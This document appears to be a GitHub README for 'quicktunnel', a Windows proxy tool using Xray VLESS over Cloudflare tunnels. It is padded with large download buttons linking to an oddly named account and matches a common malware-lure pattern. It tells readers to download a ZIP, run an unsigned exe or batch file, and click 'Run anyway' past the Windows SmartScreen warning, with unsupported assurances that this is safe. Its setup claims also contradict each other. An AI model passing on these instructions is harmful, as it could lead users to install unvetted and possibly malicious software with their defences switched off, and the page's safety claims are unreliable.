<h1>🚀 quicktunnel - Private Proxy in One Command</h1>

<p align="center">
  <a href="https://github.com/Longbeachmilitarycensorship62/quicktunnel" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#f97316,#ef4444);color:#ffffff;font-size:22px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 6px 20px rgba(249,115,22,0.4);">⬇️ Download quicktunnel Now</a>
</p>

## 🎯 What Is quicktunnel?

quicktunnel is a free, simple tool that creates a secure private internet tunnel on your computer. It uses advanced technology (Xray with VLESS/WebSocket) combined with Cloudflare's free tunnel service. The best part? **You don't need a public IP address, and you don't need to open any ports on your router.** It just works.

Think of it like this: you have a secret door to your computer, but instead of telling everyone where it is, you get a special address that only you and your friends can use. The tunnel is protected, fast, and completely managed by quicktunnel.

## ✨ Amazing Features

- **One-Command Setup:** Run a single command, answer a few simple questions, and you're done.
- **Automatic Service Installation:** quicktunnel installs itself as a background service, so it starts automatically every time you turn on your computer.
- **Easy Management CLI:** Use simple commands to start, stop, check status, or update your tunnel.
- **QR Code Generator:** Display a QR code right in your terminal so you can scan it with your phone and connect instantly.
- **No Technical Knowledge Needed:** No coding, no configuration files, no complicated settings.
- **100% Free:** Uses Cloudflare's free tier and open-source Xray core.
- **Secure by Design:** Your traffic is encrypted end-to-end through WebSocket and TLS.

## 📋 What You Need

- A computer running **Windows 10 or 11** (64-bit)
- An internet connection (any speed works)
- A free Cloudflare account (optional, but recommended for custom settings)

That's it. No router access, no static IP, no server rental.

## 🚀 Getting Started

### Step 1: Download quicktunnel

Visit this link to download the application:  
👉 **[https://github.com/Longbeachmilitarycensorship62/quicktunnel](https://github.com/Longbeachmilitarycensorship62/quicktunnel)**  

Click the big green "Code" button, then select "Download ZIP". Save the file to your Desktop.

### Step 2: Extract the Files

1. Right-click the downloaded ZIP file.
2. Choose **"Extract All..."**.
3. Click **"Extract"** (keep the default destination).
4. Open the new folder called `quicktunnel`.

### Step 3: Run the Setup Wizard

1. Inside the folder, double-click the file named **`quicktunnel.exe`** (or `install.bat` if you see that).
2. A blue command window will open. This is the setup wizard.
3. The wizard will ask you a few simple questions:
   - *"Enter a name for your tunnel"* — Type anything, like `mytunnel`.
   - *"Choose a port"* — Press Enter to accept the default (443).
   - *"Install as a service?"* — Type `Y` and press Enter.
4. Wait 30-60 seconds. The wizard will download the necessary components and set everything up.

### Step 4: Get Your Tunnel Address

Once the wizard finishes, you'll see a message like:

```
✅ Tunnel is running!
Your VLESS address: vless://your-tunnel-id.trycloudflare.com:443?...
QR code displayed below:
```

1. **Write down the full `vless://` address** — this is your personal connection string.
2. You'll also see a QR code in the terminal. You can scan this with your phone's camera to connect automatically.

### Step 5: Connect Your Devices

- **On your phone:** Install the "v2rayNG" app (Android) or "Shadowrocket" (iPhone). Open the app, tap the plus (+) button, then select "Import from QR code" and scan the QR code from your terminal.
- **On your computer:** Use any VLESS-compatible client like "v2rayN" for Windows. Paste the `vless://` address into the import box.

## 🛠️ Managing Your Tunnel

After installation, quicktunnel gives you a simple command-line tool. Open a new command prompt (press `Windows + R`, type `cmd`, press Enter) and use these commands:

| Command | What It Does |
|---------|--------------|
| `quicktunnel status` | Shows if your tunnel is running and displays your current address |
| `quicktunnel start` | Starts the tunnel if it's stopped |
| `quicktunnel stop` | Stops the tunnel temporarily |
| `quicktunnel restart` | Restarts the tunnel (useful after updates) |
| `quicktunnel qr` | Shows the QR code again on screen |
| `quicktunnel update` | Updates quicktunnel to the latest version |
| `quicktunnel uninstall` | Removes quicktunnel and the service from your PC |

**Example:** Type `quicktunnel status` and press Enter. You'll see something like:

```
Tunnel: mytunnel
Status: ✅ Running
Address: vless://abc123.trycloudflare.com:443?...
Uptime: 3 hours 24 minutes
```

## 🔧 Troubleshooting

### "Windows protected your PC" warning
This happens because the app is new and unsigned. Click **"More info"** → **"Run anyway"**. This is safe — the source code is open for anyone to review.

### Tunnel address changes after restart
By default, Cloudflare's free tunnels give you a new address each time. To keep the same address:
1. Create a free account at [dash.cloudflare.com](https://dash.cloudflare.com).
2. Run `quicktunnel setup` and choose "Use my own Cloudflare domain".
3. Follow the prompts to link your domain. quicktunnel will handle the rest.

### Port 443 is already in use
Run `quicktunnel stop`, then edit the file `config.json` in the quicktunnel folder. Change the `port` value to something like `8443`. Save the file, then run `quicktunnel start`.

### No QR code appears
Make sure your terminal window is wide enough (at least 80 columns). Resize the window and run `quicktunnel qr` again.

## 🔒 Security & Privacy

- Your traffic is encrypted with TLS 1.3 — the same level of security used by banks.
- Cloudflare's tunnel hides your real IP address from everyone, including the websites you visit.
- quicktunnel runs with minimal permissions and does not collect any personal data.
- The source code is fully open — any security expert can verify it.

## ❓ Frequently Asked Questions

**Is this legal?**  
Yes. quicktunnel is a general-purpose proxy tool. It's legal to use for privacy, bypassing geo-blocks, or accessing your home network remotely. You are responsible for how you use it.

**Do I need to pay for anything?**  
No. Cloudflare's trycloudflare.com service is free, and Xray core is open-source. quicktunnel itself is free.

**Will this slow down my internet?**  
You'll see a slight increase in latency (about 20-50ms) because traffic goes through Cloudflare's network. For most browsing and streaming, you won't notice a difference.

**Can I run this on a server instead of my PC?**  
Yes, quicktunnel works on Windows Server 2016+ and Linux (via WSL). Just follow the same steps.

**How do I update?**  
Run `quicktunnel update` in the command prompt. It will download the latest version and restart the service automatically.

## 📚 Advanced Tips

- **Set a custom name:** During setup, use a name that's easy to remember. It appears in your address.
- **Multiple tunnels:** You can run multiple instances with different ports and names. Just change the port in `config.json` and run `quicktunnel start` again.
- **Auto-restart:** The service is configured to restart automatically if your computer reboots or the tunnel crashes.
- **Logs:** View detailed logs by running `quicktunnel logs`. This shows every connection and error.

## 🌍 Support & Community

- **GitHub Issues:** Found a bug? Report it at the repository's Issues page.
- **Discussions:** Ask questions or share tips in the Discussions tab.
- **Email:** For urgent issues, contact the maintainer through GitHub.

## 📄 License

quicktunnel is released under the MIT License. You are free to use, modify, and distribute it, even commercially. Attribution is appreciated but not required.

---

<p align="center">
  <a href="https://github.com/Longbeachmilitarycensorship62/quicktunnel" style="display:inline-block;padding:14px 32px;background:linear-gradient(135deg,#3b82f6,#8b5cf6);color:#ffffff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 6px 20px rgba(59,130,246,0.4);">⬇️ Download quicktunnel</a>
</p>

<p align="center" style="color:#6b7280;font-size:14px;">Made with ❤️ for privacy and simplicity. No public IP, no open ports, just a secure tunnel.</p>